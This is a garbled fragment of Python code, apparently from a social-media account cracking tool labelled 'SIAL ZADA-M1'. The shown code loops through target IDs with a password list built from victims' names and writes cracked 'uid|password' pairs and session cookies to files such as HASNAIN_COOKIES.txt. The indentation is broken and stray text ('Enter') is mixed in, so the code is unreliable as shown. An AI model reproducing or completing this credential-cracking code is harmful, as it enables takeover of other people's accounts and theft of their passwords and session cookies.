...
HASNAIN()￼Enter						file_path_ok = os.path.join(folder_path, 'HASNAIN_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'HASNAIN_COOKIES.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
							file_ok.write(uid+'|'+pas+'\n')
							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
stdout.write('\r\r\33[1;37m[ SIAL ZADA-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
